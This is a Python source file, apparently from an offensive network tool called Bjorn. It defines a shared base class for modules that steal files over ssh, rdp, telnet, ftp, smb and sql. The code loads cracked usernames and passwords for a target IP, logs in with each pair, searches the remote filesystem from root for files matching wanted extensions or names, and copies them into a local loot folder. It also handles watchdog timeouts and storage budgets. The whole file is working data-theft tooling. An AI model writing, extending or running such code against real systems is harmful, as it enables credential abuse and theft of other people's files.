"""base_stealer.py — shared scaffolding for the six steal modules (#12, second half).

Mirrors `base_connector.py`: each protocol module keeps its `b_class`/`b_module`/`b_port`
globals and becomes a thin adapter implementing `open_session` / `find_files` / `steal_file`.
Everything the six copies had in common — the parent-action gate, the per-run latch reset, the
cracked-credential load, the run-token-guarded watchdog timer, the credential loop and the
success/failed contract — lives here once.

Three decisions worth not re-litigating later:

**The connect hook is `open_session`, not `connect`.** `tests/test_connectors.py::_TIMEOUT_SITES`
asserts by AST that every `.connect(...)` callee in these files carries a `timeout` bound (#4).
A method named `connect` would make `self.connect(...)` match that callee and fail the guard for
having no timeout kwarg — the guard would be reporting a real-looking violation of a rule that
does not apply. The name sidesteps a collision, it is not cosmetic.

**Each adapter keeps its own logger** via `LOGGER`. `base_connector` logs its shared flow to
`base_connector.py.log`; doing the same here would move the steal flow out of
`data/logs/steal_files_<proto>.py.log`, which is where every runbook, diagnostic and past
post-mortem looks. One line per adapter buys keeping that.

**The latch reset stays inside `execute()`.** These are long-lived singletons the orchestrator
builds once. The flags used to latch: once the 240s timer fired for ANY host, `stop_execution`
stayed True and every later steal on every host returned 'failed' until restart; conversely one
success left `*_connected` True and disarmed the timeout for good. `tests/test_steal_modules.py`
pins both the behaviour and its presence in source.
"""
from __future__ import annotations

import logging
import os
import shutil
from threading import Timer

from logger import Logger
from shared import settle_for_display

logger = Logger(name="base_stealer.py", level=logging.DEBUG)

# #6 caps. Same values the ftp/smb/sql modules already carry — lifted here rather than restated,
# because the audit that declared #6 done was wrong: ssh, rdp and telnet never got them, so a
# single large file over SFTP could still fill a 512 MB Pi Zero's card. Living on the base is the
# point: an adapter cannot forget what it does not have to remember.
MAX_DEPTH = 6
MAX_FILES_PER_RUN = 100
MAX_FILE_BYTES = 50 * 1024 * 1024
MAX_RUN_BYTES = 200 * 1024 * 1024
MIN_FREE_BYTES = 100 * 1024 * 1024


class BaseStealer:
    """Subclass, set the constants, implement open_session / find_files / steal_file."""

    # shared_data attribute holding the cracked-credentials CSV for this protocol
    CRED_FILE_ATTR: str = ""
    # loot lands in data_stolen/<LOOT_SUBDIR>/<mac>_<ip>
    LOOT_SUBDIR: str = ""
    # per-run flag an adapter sets once a transfer channel is actually open; the watchdog reads it
    CONNECTED_FLAG: str = "session_connected"
    # where find_files starts
    ROOT: str = "/"
    # seconds to wait for a transfer channel before declaring the host a loss
    WATCHDOG_SECONDS: int = 240
    LOGGER = logger

    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.stop_execution = False
        setattr(self, self.CONNECTED_FLAG, False)
        self.LOGGER.info(f"{type(self).__name__} initialized")

    # ------------------------------------------------------------------ hooks

    def open_session(self, ip, username, password):
        """Authenticate and return a live connection. Raise on failure."""
        raise NotImplementedError

    def find_files(self, conn, dir_path):
        """Return the remote paths worth taking, filtered by the steal_file_* config."""
        raise NotImplementedError

    def steal_file(self, conn, remote_file, local_dir):
        """Transfer one remote path into local_dir."""
        raise NotImplementedError

    def close_session(self, conn):
        """Release the connection. Overridden where closing is not `.close()`."""
        try:
            conn.close()
        except Exception:  # a half-open session is not worth failing the run over
            pass

    # ---------------------------------------------------------------- helpers

    def mark_connected(self):
        """Adapters call this the moment a transfer channel opens, to disarm the watchdog."""
        setattr(self, self.CONNECTED_FLAG, True)

    def check_budget(self, local_dir):
        """Free-space precheck + per-run byte budget. False means stop, and says why (#6).

        Sets stop_execution rather than raising: a full card is a reason to end the run cleanly,
        not to mark the host failed for something that is Bjorn's problem, not the target's.
        """
        try:
            probe = local_dir if os.path.isdir(local_dir) else os.path.dirname(local_dir) or '/'
            free = shutil.disk_usage(probe).free
        except Exception:
            free = shutil.disk_usage('/').free
        if free < MIN_FREE_BYTES:
            self.LOGGER.error(
                f"Refusing steal: only {free} bytes free (need {MIN_FREE_BYTES})")
            self.stop_execution = True
            return False
        if getattr(self, '_run_bytes', 0) >= MAX_RUN_BYTES:
            self.LOGGER.warning(
                f"Per-run byte budget ({MAX_RUN_BYTES}) exhausted; stopping")
            self.stop_execution = True
            return False
        return True

    def fits_budget(self, size):
        """Whether a file of this known size may still be taken this run."""
        if size > MAX_FILE_BYTES:
            return False
        return getattr(self, '_run_bytes', 0) + size <= MAX_RUN_BYTES

    def note_bytes(self, size):
        self._run_bytes = getattr(self, '_run_bytes', 0) + size

    def matches_wanted(self, path):
        """The steal_file_extensions / steal_file_names filter, applied identically everywhere."""
        return (any(path.endswith(ext) for ext in self.shared_data.steal_file_extensions)
                or any(name in path for name in self.shared_data.steal_file_names))

    def load_credentials(self, ip):
        """Cracked (user, password) pairs for this IP, from the protocol's CSV.

        Column layout is the shared cracked-creds shape: MAC, IP, Hostname, User, Password, Port.
        An adapter whose file differs overrides this rather than adding column constants nobody
        else would use.
        """
        path = getattr(self.shared_data, self.CRED_FILE_ATTR)
        credentials = []
        if os.path.exists(path):
            with open(path, 'r') as f:
                for line in f.readlines()[1:]:  # skip the header
                    parts = line.strip().split(',')
                    if len(parts) > 4 and parts[1] == ip:
                        credentials.append((parts[3], parts[4]))
            self.LOGGER.info(f"Found {len(credentials)} credentials for {ip}")
        return credentials

    def loot_dir(self, ip, row):
        return os.path.join(self.shared_data.datastolendir,
                            f"{self.LOOT_SUBDIR}/{row['MAC Address']}_{ip}")

    # ---------------------------------------------------------------- the flow

    def execute(self, ip, port, row, status_key):
        try:
            if 'success' not in row.get(self.b_parent_action, ''):
                self.LOGGER.error(f"Parent action not successful for {ip}. Skipping steal action.")
                return 'failed'

            self.shared_data.bjornorch_status = type(self).__name__
            # Per-run state, reset here rather than only in __init__ — see the module docstring.
            self.stop_execution = False
            setattr(self, self.CONNECTED_FLAG, False)
            self._run_bytes = 0  # the per-run budget is per run, not per lifetime
            settle_for_display(self.shared_data)  # let the panel show this action's name
            self.LOGGER.info(f"Stealing from {ip}:{port}...")

            credentials = self.load_credentials(ip)
            if not credentials:
                self.LOGGER.error(f"No valid credentials found for {ip}. Skipping...")
                return 'failed'

            # Token this run. timer.cancel() is only reached on the success path, so a failed
            # steal leaves a live watchdog behind; without this it would fire midway through a
            # LATER host's steal and abort it by setting stop_execution.
            run_token = object()
            self._run_token = run_token

            def watchdog():
                if getattr(self, '_run_token', None) is not run_token:
                    return  # a later execute() owns the flags now
                if not getattr(self, self.CONNECTED_FLAG, False):
                    self.LOGGER.error(
                        f"No transfer channel established within {self.WATCHDOG_SECONDS}s "
                        f"for {ip}. Marking as failed.")
                    self.stop_execution = True

            timer = Timer(self.WATCHDOG_SECONDS, watchdog)
            timer.daemon = True  # never hold up shutdown waiting on the watchdog
            timer.start()

            try:
                for username, password in credentials:
                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                        self.LOGGER.info("Steal interrupted.")
                        break
                    conn = None
                    try:
                        self.LOGGER.info(f"Trying credential {username} for {ip}")
                        conn = self.open_session(ip, username, password)
                        remote_files = self.find_files(conn, self.ROOT)
                        if remote_files:
                            local_dir = self.loot_dir(ip, row)
                            for remote_file in remote_files:
                                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                    self.LOGGER.info("Steal interrupted.")
                                    break
                                self.steal_file(conn, remote_file, local_dir)
                            self.LOGGER.success(
                                f"Successfully stolen {len(remote_files)} file(s) from "
                                f"{ip}:{port} using {username}")
                            return 'success'
                    except Exception as e:
                        self.LOGGER.error(f"Error stealing from {ip} as {username}: {e}")
                    finally:
                        if conn is not None:
                            self.close_session(conn)
            finally:
                timer.cancel()  # in a finally: the old code cancelled only on the success path

            self.LOGGER.error(f"Failed to steal anything from {ip}:{port}")
            return 'failed'
        except Exception as e:
            self.LOGGER.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'
